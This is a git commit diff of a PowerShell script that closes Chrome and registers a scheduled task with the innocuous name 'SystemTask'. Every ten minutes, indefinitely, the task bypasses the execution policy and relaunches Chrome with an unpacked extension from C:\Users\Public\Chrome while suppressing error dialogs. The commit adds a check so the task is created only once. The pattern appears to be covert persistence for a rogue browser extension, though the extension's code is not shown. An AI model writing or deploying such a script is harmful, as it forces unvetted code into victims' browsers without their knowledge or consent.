0add44d56e90ebff45960166b8a9c629d624869f
Mxfire0324 <162410399+Mxfire0324@users.noreply.github.com>
2024-03-06 12:59:51 +0530

    task.ps1

--- task.ps1
+++ task.ps1
@@ -1,4 +1,5 @@
 $extPath = "C:\Users\Public\Chrome"
+$taskName = "SystemTask"
 
 # Terminate all running instances of Chrome, if any
 Get-Process -Name chrome -ErrorAction SilentlyContinue | ForEach-Object {
@@ -19,7 +20,15 @@ if (Test-Path -Path $extPath) {
     "Extension directory not found."
 }
 
-# Create the scheduled task
-$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-ExecutionPolicy Bypass -Command `"& { $extPath = 'C:\Users\Public\Chrome'; Start-Process chrome '--load-extension=""$extPath"" --restore-last-session --noerrdialogs --disable-session-crashed-bubble' }`""
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration ([TimeSpan]::MaxValue)
-Register-ScheduledTask -TaskName "SystemTask" -Action $action -Trigger $trigger -Description "Update."
+# Check if the task exists
+$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+
+if (-not $taskExists) {
+    # Create the scheduled task if it doesn't exist
+    $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-ExecutionPolicy Bypass -Command `"& { $extPath = 'C:\Users\Public\Chrome'; Start-Process chrome '--load-extension=""$extPath"" --restore-last-session --noerrdialogs --disable-session-crashed-bubble' }`""
+    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration ([TimeSpan]::MaxValue)
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "Runs the script every ten minutes."
+    "Scheduled task '$taskName' created."
+} else {
+    "Scheduled task '$taskName' already exists."
+}
